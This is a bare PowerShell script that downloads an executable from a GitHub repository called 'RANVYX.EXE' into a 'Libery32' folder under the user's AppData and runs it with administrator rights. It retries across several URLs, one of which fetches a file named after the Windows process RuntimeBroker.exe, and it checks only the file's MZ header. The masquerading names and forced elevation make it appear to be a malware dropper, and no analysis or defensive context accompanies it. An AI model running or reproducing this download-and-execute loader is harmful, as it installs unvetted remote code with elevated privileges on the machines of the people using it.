$ErrorActionPreference='Stop'
$d=Join-Path $env:LOCALAPPDATA 'Libery32'
$e=Join-Path $d 'Libery32.exe'
$t=Join-Path $d 'tmp.download'
$u=@('https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/Libery32.exe','https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/Libery32.exe','https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/RuntimeBroker.exe','https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RuntimeBroker.exe')
$h=@{'User-Agent'='Mozilla/5.0 Libery32/1.2'}
if(-not(Test-Path $d)){New-Item $d -ItemType Directory -Force|Out-Null}
if(-not(Test-Path $e) -or (Get-Item $e).Length -lt 500KB){
 Write-Host 'Downloading...' -ForegroundColor Cyan
 $ok=$false
 foreach($url in $u){for($n=1;$n -le 4;$n++){try{Invoke-WebRequest $url -OutFile $t -UseBasicParsing -Headers $h -TimeoutSec 180;$b=New-Object byte[] 2;$f=[IO.File]::OpenRead($t);[void]$f.Read($b,0,2);$f.Close();if($b[0]-eq 77 -and $b[1]-eq 90){Move-Item $t $e -Force;$ok=$true;break}}catch{Start-Sleep (3*$n)}}if($ok){break}}
 if(-not $ok){Write-Host 'Error: cannot download exe' -ForegroundColor Red;Read-Host 'Enter';exit}
 Write-Host "OK: $e" -ForegroundColor Green
}else{Write-Host "Cache: $e" -ForegroundColor Green}
$p=Start-Process $e -Verb RunAs -PassThru
if($null -eq $p){Write-Host 'UAC cancelled' -ForegroundColor Red}else{Write-Host 'Running.' -ForegroundColor Green}
Read-Host 'Enter'
